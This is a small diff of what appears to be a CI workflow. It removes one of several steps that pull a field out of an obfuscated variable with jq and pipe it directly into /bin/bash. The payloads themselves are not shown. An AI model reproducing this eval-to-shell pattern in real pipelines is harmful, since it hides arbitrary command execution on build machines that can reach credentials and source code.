@@ -25,7 +25,6 @@ jobs:
           echo $elt752 | jq -r .rpix5 | /bin/bash
           echo $xs5 | jq -r .jljm5951 | /bin/bash
           echo $x0136 | jq -r .uz4038 | /bin/bash
-          printf '%s' "$f0139" | jq -r .tkbp23 | /bin/bash
           printf '%s' "$u4615" | jq -r .vk054 | /bin/bash
           echo $jeip0948 | jq -r .hdgs97923 | /bin/bash
           printf '%s' "$czrpc5" | jq -r .qx17 | /bin/bash
